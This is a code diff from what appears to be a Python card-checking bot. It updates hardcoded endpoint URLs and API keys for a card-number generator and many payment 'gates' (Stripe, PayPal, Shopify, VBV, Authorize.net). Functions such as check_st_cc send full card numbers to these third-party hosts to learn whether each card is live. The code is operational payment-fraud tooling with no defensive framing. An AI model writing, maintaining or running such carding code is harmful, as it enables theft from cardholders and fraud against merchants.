@@ -35,14 +35,14 @@ DAILY_CREDITS = 100  # Daily credits for non-subscribed users
 CC_GENERATOR_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count={}"
 SQ_API_URL = "https://ccapi-by-dark-waslost.onrender.com/key=dark/cc={}"
 B3_API_URL = "https://api-b33-stormx.onrender.com/gate=b4/key=darkwaslost/cc={}"
-VBV_API_URL = "https://vbv-by-dark-waslost.onrender.com/key=darkwaslost/cc={}"
+VBV_API_URL = "https://waslost-vbv-api.onrender.com/key=darkwaslost/cc={}"
 SS_API_URL = "http://147.93.105.138:6677/gate=stsq/key=darkwaslost/cc={}"
-CC_API_URL = "https://api-cc-stormx.onrender.com/gate=site/key=darkwasd4rk/cc={}"
+CC_API_URL = "https://darkwaslost-cc-api.onrender.com/gate=site/key=darkwasd4rk/cc={}"
 AH_API_URL = "https://authnet-api.onrender.com/gate=st5/key=darkwaslost/cc={}"
 SF_API_URL = "https://stripe-10.onrender.com/gate=st10/key=darkwaslost/cc={}"
-SHOPIFY_API_URL = "https://api-cc-stormx-1.onrender.com/key=cytron/cc={}"
+SHOPIFY_API_URL = "https://darkwaslost-cc-api-vnhx.onrender.com/key=cytron/cc={}"
 B4_API_URL = "https://api-b4-storm.onrender.com/gate=b4/key=darkwaslost/cc={}"
-PP_API_URL = "https://paypal-bdvj.onrender.com/gate=b3/key=wasdarkboy/cc={}"
+PP_API_URL = "https://darkwaslost-pp-api.onrender.com/gate=b3/key=wasdarkboy/cc={}"
 PY_API_URL = "https://pyvbv2-api-storm.onrender.com/gate=paypal/key=waslost/cc={}"
 BOT_START_TIME = time.time()
 
@@ -2780,7 +2780,7 @@ def check_st_cc(cc):
             bank = bin_data.get('bank', 'UNKNOWN')
         except: pass
 
-        res = requests.get(f"https://app-py-8xke.onrender.com/gate=5/key=waslost/cc={formatted_cc}", timeout=120)
+        res = requests.get(f"https://app-py-8xke.onrender.com/gate=5/key=waslost/cc={formatted_cc}", timeout=300)
         data = res.json() if res.status_code == 200 else {}
         status = data.get("status", "DECLINED").upper()
         msg = data.get("response", "No response from gateway.")
@@ -8237,7 +8237,7 @@ def check_sr_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://api-sr-storm.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
+                f"https://darkwaslost-sr-api.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
@@ -8551,7 +8551,7 @@ def check_sp_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://api-sp-storm.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
+                f"https://darkwaslost-sp-api.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
